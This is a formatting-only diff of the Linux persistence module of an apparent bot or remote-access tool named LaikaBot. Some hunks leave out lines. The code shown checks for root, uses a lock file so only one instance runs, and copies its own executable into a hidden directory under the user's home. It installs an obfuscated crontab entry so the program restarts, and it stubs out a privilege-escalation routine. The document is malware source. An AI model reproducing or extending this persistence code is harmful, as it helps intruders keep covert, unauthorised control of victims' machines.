@@ -1,32 +1,35 @@
 /* platform specific code for achieving persistence on linux */
 
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/file.h>
-#include <pwd.h>
-
-#include "persist.h"
-#include "lconfig.h"
-#include "lsocket.h"
-#include "lerror.h"
 #include "lbox.h"
+#include "lconfig.h"
+#include "lerror.h"
 #include "lmem.h"
+#include "lsocket.h"
+#include "persist.h"
+
+#include <pwd.h>
+#include <sys/file.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
 
 static int laikaB_lockFile;
 
 /* check if laika is running as super-user */
-bool laikaB_checkRoot() {
+bool laikaB_checkRoot()
+{
     return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
 }
 
 /* mark that laika is currently running */
-void laikaB_markRunning() {
-    LAIKA_BOX_SKID_START(char*, filePath, LAIKA_LIN_LOCK_FILE);
+void laikaB_markRunning()
+{
+    LAIKA_BOX_SKID_START(char *, filePath, LAIKA_LIN_LOCK_FILE);
 
     /* create lock file */
     if ((laikaB_lockFile = open(filePath, O_RDWR | O_CREAT, 0666)) == -1)
-        LAIKA_ERROR("Couldn't open file lock '%s'! Another LaikaBot is probably running.\n", filePath);
+        LAIKA_ERROR("Couldn't open file lock '%s'! Another LaikaBot is probably running.\n",
+                    filePath);
 
     /* create lock */
     if (flock(laikaB_lockFile, LOCK_EX | LOCK_NB) != 0)
@@ -37,7 +40,8 @@ void laikaB_markRunning() {
 }
 
 /* unmark that laika is currently running */
-void laikaB_unmarkRunning() {
+void laikaB_unmarkRunning()
+{
     /* close lock */
     if (flock(laikaB_lockFile, LOCK_UN) != 0)
         LAIKA_ERROR("Failed to close file lock!\n");
@@ -46,7 +50,8 @@ void laikaB_unmarkRunning() {
     LAIKA_DEBUG("file lock removed!\n");
 }
 
-void getCurrentExe(char *outPath, int pathSz) {
+void getCurrentExe(char *outPath, int pathSz)
+{
     int sz;
 
     /* thanks linux :D */
@@ -56,7 +61,8 @@ void getCurrentExe(char *outPath, int pathSz) {
     outPath[sz] = '\0';
 }
 
-void getInstallPath(char *outPath, int pathSz) {
+void getInstallPath(char *outPath, int pathSz)
+{
     struct stat st;
     const char *home;
 
@@ -66,8 +72,8 @@ void getInstallPath(char *outPath, int pathSz) {
     }
 
     /* create install directory if it doesn't exist */
-    LAIKA_BOX_SKID_START(char*, dirPath, LAIKA_LIN_INSTALL_DIR);
-    LAIKA_BOX_SKID_START(char*, filePath, LAIKA_LIN_INSTALL_FILE);
+    LAIKA_BOX_SKID_START(char *, dirPath, LAIKA_LIN_INSTALL_DIR);
+    LAIKA_BOX_SKID_START(char *, filePath, LAIKA_LIN_INSTALL_FILE);
     snprintf(outPath, pathSz, "%s/%s", home, dirPath);
     if (stat(outPath, &st) == -1) {
         LAIKA_DEBUG("creating '%s'...\n", outPath);
@@ -79,7 +85,8 @@ void getInstallPath(char *outPath, int pathSz) {
     LAIKA_BOX_SKID_END(filePath);
 }
 
-bool checkPersistCron(char *path) {
+bool checkPersistCron(char *path)
+{
     char buf[PATH_MAX + 128];
     FILE *fp;
     bool res = false;
@@ -99,8 +106,9 @@ bool checkPersistCron(char *path) {
     return res;
 }
 
-void tryPersistCron(char *path) {
-    LAIKA_BOX_SKID_START(char*, cronCMD, LAIKA_LIN_CRONTAB_ENTRY);
+void tryPersistCron(char *path)
+{
+    LAIKA_BOX_SKID_START(char *, cronCMD, LAIKA_LIN_CRONTAB_ENTRY);
     char cmd[PATH_MAX + 128];
 
     /* should be 'safe enough' */
@@ -115,7 +123,8 @@ void tryPersistCron(char *path) {
 }
 
 /* try to gain persistance on machine */
-void laikaB_tryPersist() {
+void laikaB_tryPersist()
+{
     char exePath[PATH_MAX];
     char installPath[PATH_MAX];
 
@@ -124,7 +133,8 @@ void laikaB_tryPersist() {
     getInstallPath(installPath, PATH_MAX);
 
     /* move exe to install path (if it isn't there already) */
-    if (strncmp(exePath, installPath, strnlen(exePath, PATH_MAX)) != 0 && rename(exePath, installPath))
+    if (strncmp(exePath, installPath, strnlen(exePath, PATH_MAX)) != 0 &&
+        rename(exePath, installPath))
         LAIKA_ERROR("Failed to install '%s' to '%s'!\n", exePath, installPath);
 
     LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);
@@ -139,6 +149,7 @@ void laikaB_tryPersist() {
 }
 
 /* try to gain root */
-void laikaB_tryRoot() {
+void laikaB_tryRoot()
+{
     /* stubbed */
 }
